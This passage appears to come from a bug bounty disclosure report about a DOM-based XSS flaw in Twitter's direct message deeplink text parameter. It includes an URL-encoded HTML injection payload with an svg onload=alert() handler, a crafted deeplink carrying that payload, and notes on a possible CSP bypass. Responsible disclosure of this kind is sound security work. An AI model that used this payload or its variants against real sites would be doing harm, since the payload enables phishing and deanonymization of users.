Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).\n  2. Use the following payload as the value for the text parameter:\n```\n%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n  3. Tweet the deeplink you created. It should look like the following:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026welcome_message_id=988274596427304964\u0026text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n\n## Impact\n\nIt seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.\n\nThe hacker selected the **Cross-site Scripting (XSS) - DOM** weakness.
